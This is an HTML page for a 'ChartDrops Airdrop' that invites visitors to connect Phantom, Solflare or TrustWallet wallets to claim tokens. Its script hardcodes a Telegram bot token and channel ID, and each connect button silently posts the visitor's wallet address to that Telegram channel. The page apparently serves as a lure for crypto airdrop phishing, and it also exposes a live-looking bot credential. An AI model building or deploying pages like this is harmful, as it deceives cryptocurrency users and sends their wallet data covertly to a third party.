<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>ChartDrops Airdrop</title>
  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-wallets@0.9.19/lib/cdn/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-base@0.9.19/lib/cdn/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-react-ui/styles.css"></script>
  <style>
    body {
      background: #0d0d0d;
      color: white;
      font-family: sans-serif;
      text-align: center;
      margin-top: 80px;
    }

    .popup {
      background: #1a1a1a;
      padding: 25px;
      border-radius: 10px;
      display: inline-block;
      box-shadow: 0 0 15px rgba(0, 255, 150, 0.2);
    }

    button {
      background: #00ffae;
      border: none;
      padding: 12px 20px;
      margin: 10px;
      border-radius: 6px;
      cursor: pointer;
      color: black;
      font-weight: bold;
    }

    button:hover {
      background: #00d69b;
    }
  </style>
</head>
<body>
  <div class="popup">
    <h2>ChartDrops Airdrop</h2>
    <p>Connect your wallet to claim</p>
    <button onclick="connectPhantom()">Connect Phantom</button>
    <button onclick="connectSolflare()">Connect Solflare</button>
    <button onclick="connectTrust()">Connect TrustWallet</button>
  </div>

  <script>
    const BOT_TOKEN = "7978623862:AAHezOh3PLYYy92TIjtIN9oRof32nbfwNMQ";
    const CHANNEL_ID = "-1002600871606";

    async function sendTelegramMessage(walletAddress) {
      const message = `âœ… Wallet ${walletAddress} Connected To chartdrops.fun`;
      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHANNEL_ID,
            text: message
          })
        });

        const result = await res.json();
        console.log("Telegram Response:", result);

        if (!res.ok || !result.ok) {
          alert(`Telegram error: ${result.description || res.statusText}`);
        }
      } catch (err) {
        console.error("Telegram send error:", err);
      }
    }

    async function connectPhantom() {
      if ('solana' in window) {
        const provider = window.solana;
        if (provider.isPhantom) {
          try {
            const resp = await provider.connect();
            const walletAddress = resp.publicKey.toString();
            sendTelegramMessage(walletAddress);
            alert(`Connected: ${walletAddress}`);
          } catch (err) {
            console.error("Phantom connect error", err);
          }
        } else {
          alert("Phantom extension not found.");
        }
      } else {
        alert("Phantom not installed. Please install it.");
      }
    }

    async function connectSolflare() {
      try {
        const solflare = new window.Solflare();
        if (!solflare.isConnected) {
          await solflare.connect();
        }
        const walletAddress = solflare.publicKey.toString();
        sendTelegramMessage(walletAddress);
        alert(`Connected: ${walletAddress}`);
      } catch (err) {
        alert("Solflare connection failed.");
      }
    }

    async function connectTrust() {
      if (window.solana && window.solana.isTrust) {
        try {
          const resp = await window.solana.connect();
          const walletAddress = resp.publicKey.toString();
          sendTelegramMessage(walletAddress);
          alert(`Connected: ${walletAddress}`);
        } catch (err) {
          alert("TrustWallet connection failed.");
        }
      } else {
        alert("TrustWallet not detected.");
      }
    }
  </script>
</body>
</html>
